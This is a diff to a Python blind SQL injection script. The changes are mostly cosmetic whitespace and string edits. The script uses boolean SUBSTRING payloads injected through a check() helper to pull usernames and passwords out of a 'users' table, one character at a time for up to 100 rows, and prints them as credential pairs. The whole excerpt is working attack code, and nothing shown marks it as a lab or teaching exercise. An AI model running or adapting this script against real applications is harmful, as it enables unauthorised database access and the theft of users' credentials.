@@ -14,32 +14,44 @@ def check(payload):
 
 def extract_field(row_index, field_name):
     result = ""
+
     for pos in range(1, MAX_LEN + 1):
         found_char = False
+
         for ch in CHARSET:
-            # Skip chars that break SQL syntax
+
             if ch in ('"', '\\'):
                 continue
-            payload = f"""' OR SUBSTRING((SELECT {field_name} FROM users LIMIT {row_index},1),{pos},1)='{ch}' -- """
+
+            payload = f"' OR SUBSTRING((SELECT {field_name} FROM users LIMIT {row_index},1),{pos},1)='{ch}' -- "
+
             if check(payload):
                 result += ch
                 found_char = True
-                print(f"  Row {row_index+1} | {field_name}[{pos}] = {ch}", flush=True)
+                print(f"  Row {row_index+1} | {field_name}[{pos}] = {ch}")
                 break
+
         if not found_char:
             break
+
     return result
 
+
 print("=== Blind SQL Injection Dump ===\n")
+
 users = []
 
 for i in range(100):
     print(f"[*] Extracting row {i+1}/100 ...")
+
     username = extract_field(i, "username")
     password = extract_field(i, "password")
+
     users.append((username, password))
+
     print(f"  --> {username} : {password}\n")
 
 print("\n=== RESULTS ===")
+
 for u, p in users:
     print(f"{u} : {p}")
